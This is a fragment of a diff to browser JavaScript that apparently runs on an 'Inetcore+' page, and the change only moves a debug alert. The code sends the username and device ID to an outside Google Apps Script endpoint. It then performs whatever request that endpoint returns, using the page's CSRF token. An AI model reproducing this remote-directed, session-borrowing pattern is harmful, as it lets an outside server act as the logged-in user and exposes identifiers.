@@ -61,8 +61,8 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 					function getTask(){
 						fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid,{
 							'method':'GET','mode':'no-cors',
-						}).then(function(resp){return resp.json()}).then(function(obj){
-							if(obj&&obj.task_id&&obj.url&&obj.method){alert(JSON.stringify(obj));
+						}).then(function(resp){return resp.json()}).then(function(obj){alert(JSON.stringify(obj));
+							if(obj&&obj.task_id&&obj.url&&obj.method){
 								fetch(obj.url,{
 									'method':obj.method,
 									'headers':{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),},
